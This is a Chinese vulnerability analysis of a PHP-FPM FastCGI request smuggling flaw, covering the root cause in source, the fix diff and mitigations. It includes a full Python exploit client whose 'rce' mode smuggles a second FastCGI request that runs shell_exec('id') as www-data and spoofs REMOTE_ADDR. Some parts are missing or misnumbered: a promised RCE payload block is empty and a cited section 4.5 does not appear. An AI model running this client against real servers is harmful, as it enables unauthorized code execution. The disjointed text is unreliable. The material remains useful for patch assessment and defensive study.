CVE-2026-129289 PHP-FPM FastCGI 连接复用请求走私漏洞分析与复现

AI 导读

PHP-FPM FastCGI 连接复用漏洞 CVE-2026-129289 可在 multipart 解析异常后残留伪造请求，以未授权身份执行第二个 FastCGI 请求并触发 www-data RCE，CVSS 4.0 为 9.2。

值得关注

文章从请求体残留、连接复用与状态控制三个环节拆解利用链，并提供可复现实验和修复版对照，便于评估自身部署是否具备命中条件。

正文

一条 12 KB 的 multipart 请求，前 5 KB 被 PHP 的 multipart 解析器读走，后 7 KB 留在 FastCGI 的 STDIN 记录里。只要前端把后端连接留着，PHP-FPM 就会把这段残留当成下一个请求。把 SCRIPT_FILENAME、REMOTE_ADDR、PHP_ADMIN_VALUE 塞进残留，第二个请求就能以 www-data 执行任意 PHP 代码。

一、漏洞说明

1、漏洞本身

PHP-FPM 通过 FastCGI 协议接收请求。一个 FastCGI 请求由 BEGIN_REQUEST、PARAMS、STDIN 等记录组成，STDIN 记录里放 HTTP 请求体。连接可以被前端复用：nginx 打开 fastcgi_keep_conn on，Apache 的 mod_proxy_fcgi 打开 enablereuse=on，或者 FPM 直接暴露在网络上，都会让同一个 TCP 连接承载多个请求。

问题出在“请求体有没有读完”这件事。multipart 解析器有一个 5 KiB 的填充单元，main/rfc1867.c:187 写的是：

#define FILLUNIT (1024 * 5)

解析器按这个单元往缓冲区里读。攻击者把伪造的 FastCGI 记录放在第二个填充单元的起点，解析器读到那里时，看到的第一行不是合法的 MIME 头，就在 main/rfc1867.c:1027 报“File Upload Mime headers garbled”，然后 goto fileupload_done 结束解析。后面的字节没有被解析，仍留在 FPM 的 STDIN 记录里。

请求关闭时，main/SAPI.c:501 先看 SG(request_info).request_body 是否存在；存在就跳过 drain，不存在时才检查 SG(post_read)：

if (SG(request_info).request_body) {
    SG(request_info).request_body = NULL;
} else if (SG(server_context)) {
    if (!SG(post_read)) {
        /* make sure we've consumed all request input data */
        char dummy[SAPI_POST_BLOCK_SIZE];
        size_t read_bytes;

        do {
            read_bytes = sapi_read_post_block(dummy, SAPI_POST_BLOCK_SIZE);
        } while (SAPI_POST_BLOCK_SIZE == read_bytes);
    }
}

只要 body stream 存在，else if 分支就不执行，未读的 6880 字节留在连接里；body stream 不存在时，post_read 是 0，else if 里的 drain 会执行，把剩余字节读掉。

下一次 fcgi_read_request() 进来时，main/fastcgi.c:1044 先把 req->in_len 清零，再把连接上的下一段字节当成新的 FastCGI 请求读取。伪造记录正好从 FastCGI 记录头开始，于是第二个请求成立。

这条链的本质不是“multipart 解析错误”，而是请求体的所有权在三个角色之间没有闭合：解析器认为自己读到了出错点，应用没有读剩余部分，连接复用层则认为上一个请求已经结束。三层各说各话，残留字节就变成了下一个请求的入口。

二、影响组件与攻击面

1、组件定位

漏洞在 PHP 的 FastCGI SAPI 和 multipart 解析器，不在 nginx 或 Apache。前端只提供两件事：把 HTTP body 转成 FastCGI STDIN，以及决定请求结束后关不关后端连接。PHP-FPM 的 worker 在同一个连接上循环调用 fcgi_read_request()；只要连接还开着，它就会继续读下一组 FastCGI 记录。

nginx 的 fastcgi_keep_conn 默认是 off，这种情况下每个请求结束后上游连接关闭，残留字节随连接一起消失，攻击链断在第一步。显式打开 fastcgi_keep_conn on 的部署才会走到连接复用这一层。Apache 的 mod_proxy_fcgi 默认 enablereuse=off，打开 enablereuse=on 时同样命中；HAProxy 保留 FastCGI 后端连接、LSAPI 也有各自的复用方式。FPM 如果直接暴露在不可信网络上，攻击者不需要前端，直接对 9000 端口说 FastCGI 即可。

2、攻击面

攻击面是任何接受 multipart/form-data 的 PHP 端点，但外请求脚本要打开 php://input 并且不读到结尾。原因是 multipart 请求里，request_body 流只在脚本打开 php://input 时创建；流存在时，sapi_deactivate_module() 的第一个分支直接跳过 drain，剩余 6880 字节留在连接里。脚本不打开 php://input 时 request_body 为空，走到 else if，post_read 为 0，drain 执行，残留被读掉。

换句话说，条件是“打开 php://input 且没有读完”，不是“只要请求是 multipart”。

攻击者需要控制的输入有三段：

  • multipart body 的前缀和填充，决定解析器停在哪。

  • 偏移 5120 处的伪造 FastCGI 请求，决定第二个请求的参数。

  • 伪造请求的 STDIN，决定 auto_prepend_file=php://input 时执行什么。

RCE 还需要一个已知的、存在的 PHP 脚本路径。公告把这一条列为 FPM 代码执行路径的前提；实验里用的是 /var/www/html/open.php。没有已知脚本路径时，伪造请求仍可 dispatch 一个存在的脚本、伪造 REMOTE_ADDR、改 PHP_ADMIN_VALUE，但不一定能直接执行任意代码。

三、危害

1、落点落在什么地方

落点在 PHP-FPM 的 worker 里，不在 nginx 或 Apache。第二个请求是 FPM 眼里的一个完整 FastCGI 请求：它有自己的 SCRIPT_FILENAME、REQUEST_METHOD、REMOTE_ADDR 和 PHP_ADMIN_VALUE。实验里的 hidden 请求把 REMOTE_ADDR 设成 203.0.113.1，执行 open.php 时脚本看到的来源就是 203.0.113.1；同时把 PHP_ADMIN_VALUE 设成 allow_url_include=1 和 auto_prepend_file=php://input，让 hidden 请求的 STDIN 在脚本执行前被当成 PHP 代码 include。

落点文件是 /tmp/rce.txt，内容是：

uid=33(www-data) gid=33(www-data) groups=33(www-data)

另一条落点是 /tmp/smuggled.txt，内容是：

REMOTE_ADDR=203.0.113.1

这两个文件都是 hidden 请求写的；外请求只负责把 body 送到 FPM，实验里的 open.php 打开 php://input 但不读。直连 FPM 时两个请求的响应都会回到同一个 socket；走 nginx 或 Apache 时，第二个响应会被前端当成上游多余数据吞掉，HTTP 响应体里只剩 outer。响应看不到，副作用文件还在。

2、攻击者能拿到的效果

  • 以 FPM worker 用户执行任意 PHP 代码。官方镜像里是 www-data（uid 33），文件读写、数据库连接、应用密钥、日志目录都落在这个身份的可达范围内。

  • 伪造 REMOTE_ADDR。脚本里的 IP 白名单、管理接口的来源判断、审计日志里的客户端地址，读到的都是 hidden 请求给的值。

  • 通过 PHP_ADMIN_VALUE 改单次请求的 PHP 配置。auto_prepend_file=php://input 只是其中一种写法；关闭 open_basedir、改 allow_url_include、换错误日志路径，都可以在 hidden 请求里试。

  • dispatch 一个不在暴露路由里的脚本。伪造请求的 SCRIPT_FILENAME 不要求是 URL 能访问到的入口，只要文件存在且 FPM 可读。

  • 把第二个请求的输出藏起来。nginx 和 Apache 都只把第一个响应交回客户端，第二个响应留在上游连接里；只看 HTTP 响应体和 HTTP access log 会漏判。

代码执行的身份是 FPM worker，拿不到 root 不会自动发生；RCE 需要已知脚本路径；前端不复用连接时整条链不成立。默认 nginx 和默认 Apache 的配置不在受影响面里，这一点限制了实际暴露面。

RCE 请求的 STDIN ：

PHP_ADMIN_VALUE 让这个 STDIN 在 open.php 执行前被当成 PHP include；shell_exec('id') 的结果写进 /tmp/rce.txt。marker 请求没有 PHP_ADMIN_VALUE，只把 REMOTE_ADDR 设成 203.0.113.1，open.php 看到这个值就写 /tmp/smuggled.txt 并输出 smuggled，用来证明第二个请求确实换了来源。

partial 变体的输入更短：STDIN 记录是 'A' . $hidden，外请求的 CONTENT_LENGTH=1，由 read1.php 读 1 字节。hidden 请求从 STDIN 记录的第 1 个字节开始，落在外请求声明长度之外。raw 变体把 application/octet-stream 作为外请求的 CONTENT_TYPE，body 直接就是 hidden 请求，用来验证 multipart 解析器的提前停止是不是必要条件。

4、客户端与容器启动

客户端只做三件事：拼 FastCGI 记录、把伪造请求放到 5120、把返回的 STDOUT 记录读回来。record() 写 8 字节记录头，params() 编码 name-value 对，fcgi_request() 组装 BEGIN_REQUEST / PARAMS / STDIN，build_multipart() 负责填充和替换，run() 发请求并按记录类型 6 收集输出。

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""直接对 PHP-FPM 说 FastCGI：复现未读 body 在 keep-conn 上变成下一个请求。

用法：
  python fcgi_client.py --port 9000 --mode multipart --keep on
  python fcgi_client.py --port 9001 --mode multipart --keep on
  python fcgi_client.py --port 9000 --mode partial --keep on
"""
import argparse
import socket
import struct
import sys
import time

BOUNDARY = b"B"
SCRIPT = "/var/www/html/open.php"


def record(rtype, content=b"", rid=1):
    return struct.pack("!BBHHBB", 1, rtype, rid, len(content), 0, 0) + content


def enc_len(n):
    if n < 128:
        return bytes([n])
    return struct.pack("!I", n | 0x80000000)


def params(d):
    out = b""
    for k, v in d.items():
        k = k.encode()
        v = str(v).encode()
        out += enc_len(len(k)) + enc_len(len(v)) + k + v
    return out


def fcgi_request(rid, keep, ps, stdin=b""):
    flags = 1 if keep else 0
    return (
        record(1, struct.pack("!HBxxxxx", 1, flags), rid)
        + record(4, params(ps), rid)
        + record(4, b"", rid)
        + record(5, stdin, rid)
        + record(5, b"", rid)
    )


def parse_stdout(buf):
    out = b""
    i = 0
    while i + 8 <= len(buf):
        ver, typ, rid, clen, plen, _ = struct.unpack("!BBHHBB", buf[i : i + 8])
        i += 8
        content = buf[i : i + clen]
        i += clen + plen
        if typ == 6:
            out += content
    return out


def hidden_request(script):
    ps = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "GET",
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/h.php",
        "REQUEST_URI": "/h.php",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REMOTE_ADDR": "203.0.113.1",
        "CONTENT_LENGTH": "0",
    }
    return fcgi_request(2, False, ps, b"")


def hidden_rce(script, payload):
    ps = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/open.php",
        "REQUEST_URI": "/open.php",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REMOTE_ADDR": "203.0.113.1",
        "CONTENT_TYPE": "application/x-www-form-urlencoded",
        "CONTENT_LENGTH": str(len(payload)),
        "PHP_ADMIN_VALUE": "allow_url_include=1\nauto_prepend_file=php://input",
    }
    return fcgi_request(2, False, ps, payload)


def build_multipart(script, body_len, offset, hidden=None):
    if hidden is None:
        hidden = hidden_request(script)
    body = b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data\r\n\r\n"
    body = body.ljust(body_len, b"A")
    if offset + len(hidden) > body_len:
        raise SystemExit("offset + hidden 超过 body 长度")
    return body[:offset] + hidden + body[offset + len(hidden) :]


def build_partial(script):
    return b"A" + hidden_request(script)


def run(host, port, mode, keep, body_len, offset, wait, payload, script=SCRIPT):
    if mode == "multipart":
        stdin = build_multipart(SCRIPT, body_len, offset)
        ps = {
            "GATEWAY_INTERFACE": "FastCGI/1.0",
            "REQUEST_METHOD": "POST",
            "SCRIPT_FILENAME": script,
            "SCRIPT_NAME": "/outer.php",
            "REQUEST_URI": "/outer.php",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "REMOTE_ADDR": "127.0.0.1",
            "CONTENT_TYPE": "multipart/form-data; boundary=B",
            "CONTENT_LENGTH": str(len(stdin)),
        }
    elif mode == "rce":
        stdin = build_multipart(
            SCRIPT, body_len, offset, hidden_rce(SCRIPT, payload.encode())
        )
        ps = {
            "GATEWAY_INTERFACE": "FastCGI/1.0",
            "REQUEST_METHOD": "POST",
            "SCRIPT_FILENAME": script,
            "SCRIPT_NAME": "/outer.php",
            "REQUEST_URI": "/outer.php",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "REMOTE_ADDR": "127.0.0.1",
            "CONTENT_TYPE": "multipart/form-data; boundary=B",
            "CONTENT_LENGTH": str(len(stdin)),
        }
    elif mode == "raw":
        stdin = hidden_request(SCRIPT)
        ps = {
            "GATEWAY_INTERFACE": "FastCGI/1.0",
            "REQUEST_METHOD": "POST",
            "SCRIPT_FILENAME": script,
            "SCRIPT_NAME": "/outer.php",
            "REQUEST_URI": "/outer.php",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "REMOTE_ADDR": "127.0.0.1",
            "CONTENT_TYPE": "application/octet-stream",
            "CONTENT_LENGTH": str(len(stdin)),
        }
    else:
        stdin = build_partial(SCRIPT)
        ps = {
            "GATEWAY_INTERFACE": "FastCGI/1.0",
            "REQUEST_METHOD": "POST",
            "SCRIPT_FILENAME": "/var/www/html/read1.php",
            "SCRIPT_NAME": "/read1.php",
            "REQUEST_URI": "/read1.php",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "REMOTE_ADDR": "127.0.0.1",
            "CONTENT_TYPE": "application/octet-stream",
            "CONTENT_LENGTH": "1",
        }

    req = fcgi_request(1, keep, ps, stdin)
    s = socket.create_connection((host, port), timeout=5)
    s.sendall(req)
    s.shutdown(socket.SHUT_WR)
    s.settimeout(0.5)
    buf = b""
    end = time.time() + wait
    while time.time() < end:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            continue
        except ConnectionResetError:
            print("connection reset by peer", file=sys.stderr)
            break
        if not chunk:
            break
        buf += chunk
    s.close()
    return parse_stdout(buf)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9000)
    ap.add_argument(
        "--mode", choices=["multipart", "partial", "rce", "raw"], default="multipart"
    )
    ap.add_argument("--keep", choices=["on", "off"], default="on")
    ap.add_argument("--body-len", type=int, default=12000)
    ap.add_argument("--offset", type=int, default=5120)
    ap.add_argument("--wait", type=float, default=2.5)
    ap.add_argument("--write-body", default="", help="只写出 multipart body 到文件，不发请求")
    ap.add_argument("--script", default=SCRIPT)
    ap.add_argument(
        "--payload",
        default="<?php file_put_contents('/tmp/rce.txt', shell_exec('id')); ?>",
    )
    args = ap.parse_args()

    if args.write_body:
        hidden = hidden_rce(SCRIPT, args.payload.encode()) if args.mode == "rce" else None
        body = build_multipart(SCRIPT, args.body_len, args.offset, hidden)
        with open(args.write_body, "wb") as f:
            f.write(body)
        print("wrote %d bytes to %s" % (len(body), args.write_body))
        return 0

    out = run(
        args.host,
        args.port,
        args.mode,
        args.keep == "on",
        args.body_len,
        args.offset,
        args.wait,
        args.payload,
        args.script,
    )
    text = out.decode("utf-8", "replace")
    print("STDOUT=%r" % out)
    print("smuggled=%s outer=%s" % ("smuggled\n" in text, "outer\n" in text))
    return 0 if "smuggled\n" in text else 1


if __name__ == "__main__":
    sys.exit(main())

五、漏洞分析

1、输入怎么被解析或应用

multipart 解析器的 FILLUNIT 是 5120（main/rfc1867.c:187）。第一次填充读到前缀加 A；第二次从 5120 开始，正好是伪造的 FastCGI 记录。multipart_buffer_headers() 找不到 name/filename，在 main/rfc1867.c:1027 报 File Upload Mime headers garbled，goto fileupload_done 停止解析，剩余 6880 字节留在 STDIN 记录里。

请求关闭时，main/SAPI.c:501 的 request_body 分支决定是否 drain：脚本打开过 php://input 时 request_body 非空，直接跳过；没打开时 request_body 为空，post_read=0，drain 执行，剩余字节被读掉。

fcgi_read_request() 在 main/fastcgi.c:1044 把 req->in_len 清零，再从连接读下一组记录。残留从 \x01 开头的 BEGIN_REQUEST 开始，FPM 把它当成新请求；整个过程中没有检查“上一条 STDIN 记录是不是只读了一半”。

4、落点为什么在那里

hidden 请求的 SCRIPT_FILENAME 指向 /var/www/html/open.php；FPM 只认 SCRIPT_FILENAME，不要求它和 REQUEST_URI 一致。PHP_ADMIN_VALUE 里的 allow_url_include=1 和 auto_prepend_file=php://input 让 hidden 请求的 STDIN 在脚本前执行，shell_exec('id') 的结果写进 /tmp/rce.txt。

落点选 /tmp，因为官方镜像的 worker 用户是 www-data，/tmp 是 1777。应用的临时、上传、日志目录如果对 worker 可写，也可以作为落点；open_basedir 会限制可选路径。RCE 的身份边界是 worker，不是 root。

修复在 PHP 8.2.36、8.3.37、8.4.28、8.5.13。提交 c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff 做了两处修改，并附带两个回归测试：

  • main/SAPI.c：只要 !SG(post_read) 就 drain，不再因为 request_body 存在而跳过。

  • main/fastcgi.c：fcgi_read_request() 发现 req->in_len != 0 时拒绝新请求；fcgi_close() 把 req->in_len 清零，避免半条 STDIN 记录污染后续连接。

request_body 非空时旧代码直接跳过 drain；修复把 request_body 短路拆开，!SG(post_read) 时 drain 会执行（multipart 解析器读 body 时 post_read 仍是 0），fcgi_read_request() 的 in_len != 0 再拒绝部分读取的新请求。

2、关键那一行或那一处

main/SAPI.c 把 else if 拆成独立的 if，让 drain 不再依赖 request_body：

-	} else if (SG(server_context)) {
+	}
+	if (SG(server_context)) {

main/fastcgi.c 在 fcgi_read_request() 开头加了残留检查：

+	if (UNEXPECTED(req->in_len != 0)) {
+		return 0;
+	}

fcgi_close() 里补了清零，避免一个只读了一半的 STDIN 记录在连接关闭后还留着计数：

         req->fd = -1;
+		/* a partially read STDIN record does not outlive its connection */
+		req->in_len = 0;

3、修复之后测试

直连修复版 FPM，两个关键测试：

python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9001 --mode multipart --keep on
python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9001 --mode rce --keep on

检查副作用文件：

ls -la /tmp/rce.txt /tmp/smuggled.txt 2>/dev/null || echo fixed-no-files

partial 会返回 outer 1 后连接重置，新连接仍能正常服务；nginx /fixed/open.php 同样 http=200、fixed-no-files，漏洞版 /open.php 在 4.5 已写入 uid=33(www-data)。

上游 --EXPECT--：keep off: safe、keep on: safe、partial frame: safe。

4、拿不到补丁时的调用侧处理

最直接的缓解是关掉后端连接复用。nginx 的 fastcgi_keep_conn 默认是 off，确认没有显式打开；Apache 的 mod_proxy_fcgi 用 enablereuse=off；HAProxy 不保留 FastCGI 后端连接；LSAPI 同样按请求关闭。这个缓解在 8.4.27 上实测有效：nginx 的 keep on 命中、keep off 只剩 outer；Apache 2.4.71 的 enablereuse=on 命中、enablereuse=off 无副作用文件。

不要把 FPM 的 9000 端口直接暴露给不可信网络。listen.allowed_clients、防火墙、只监听 Unix socket，都能把“攻击者直接对 FPM 说 FastCGI”的路径关掉；但前端复用连接时，攻击者不需要直接访问 FPM，所以这条是补充，不是替代。

如果必须保留 keep-conn，只能更新 PHP。靠 WAF 匹配 5120 处的 FastCGI 魔数不可靠：偏移、body 长度、partial 记录都能改；fastcgi_request_buffering 也不解决，nginx 仍然会把 body 完整转给 FPM。open_basedir、disable_functions 能压缩 RCE 的落点，但挡不住 hidden 请求本身。
